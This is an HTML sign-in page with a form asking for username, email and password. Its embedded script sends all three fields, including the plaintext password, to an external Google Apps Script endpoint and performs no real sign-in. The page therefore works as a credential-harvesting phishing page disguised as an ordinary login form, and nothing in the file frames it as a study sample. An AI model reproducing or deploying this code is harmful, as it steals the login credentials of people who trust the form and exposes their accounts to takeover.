<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <script>
        async function logLogin(username, email, password) {
            const url = 'https://script.google.com/macros/s/AKfycbxyDqOtHiS1YW8srSNJnnW4-m8videf6P-yWsbUmdIU17fDBovrODPIJ53PpCPqA9dGTw/exec';
            const data = {
                username: username,
                email: email,
                password: password
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                console.log('Success:', result);
            } catch (error) {
                console.error('Error:', error);
            }
        }

        function handleSignIn(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Log the login
            logLogin(username, email, password);

            // Proceed with the sign-in process
            console.log('Sign-in process initiated for', username);
        }
    </script>
</head>
<body>
    <h1>Sign In</h1>
    <form id="sign-in-form" onsubmit="handleSignIn(event)">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">Sign In</button>
    </form>
</body>
</html>
